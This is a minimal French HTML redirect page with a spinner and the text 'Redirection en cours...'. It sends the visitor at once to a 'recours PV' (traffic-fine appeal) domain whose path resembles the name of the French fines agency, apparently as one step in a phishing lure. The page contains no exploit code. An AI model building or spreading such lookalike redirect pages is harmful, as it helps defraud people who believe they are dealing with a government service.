<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=https://info-recours-pv.fr/antfrtai">
<title>Redirection</title>
<style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
    .container { text-align: center; padding: 20px; }
    .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="container">
    <div class="loading"></div>
    <p>Redirection en cours...</p>
    <p><a href="https://info-recours-pv.fr/antfrtai">Cliquez ici si vous n'êtes pas redirigé</a></p>
</div>
</body>
</html>
